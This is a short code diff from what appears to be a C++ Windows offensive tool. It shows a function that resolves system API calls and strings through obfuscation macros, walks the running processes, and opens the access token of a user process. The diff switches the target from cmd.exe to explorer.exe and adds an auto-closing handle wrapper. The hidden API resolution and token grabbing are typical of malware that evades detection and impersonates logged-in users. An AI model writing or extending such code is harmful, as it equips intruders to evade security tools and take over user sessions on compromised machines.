@@ -166,7 +166,6 @@ FARPROC resolve_winapi(const char* dll_name, const char* func_name) {
 }
 
 
-
 HANDLE get_token_of_user_process()
 {
     create_toolhelp_snapshot_type create_toolhelp_snapshot = WINAPI_OBFUSCATE(create_toolhelp_snapshot_type, "CreateToolhelp32Snapshot", "kernel32");
@@ -174,7 +173,7 @@ HANDLE get_token_of_user_process()
     process32_next_type process32_next = WINAPI_OBFUSCATE(process32_next_type, "Process32Next", "kernel32");
     open_process_type open_process = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32");
     open_process_token_type open_process_token = WINAPI_OBFUSCATE(open_process_token_type, "OpenProcessToken", "kernel32");
-    HANDLE hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
+    AutoHandle hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
     if (INVALID_HANDLE_VALUE == hSnapshot) {
         return INVALID_HANDLE_VALUE;
     }
@@ -185,7 +184,7 @@ HANDLE get_token_of_user_process()
 
     if (process32_first(hSnapshot, &pe32)) {
         do {
-            if (strcmp(reinterpret_cast<char*>(pe32.szExeFile), OBFUSCATE("cmd.exe")) != 0) {
+            if (strcmp(reinterpret_cast<char*>(pe32.szExeFile), OBFUSCATE("explorer.exe")) != 0) {
                 continue;
             }
             if (HANDLE hProcess = open_process(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID)) {
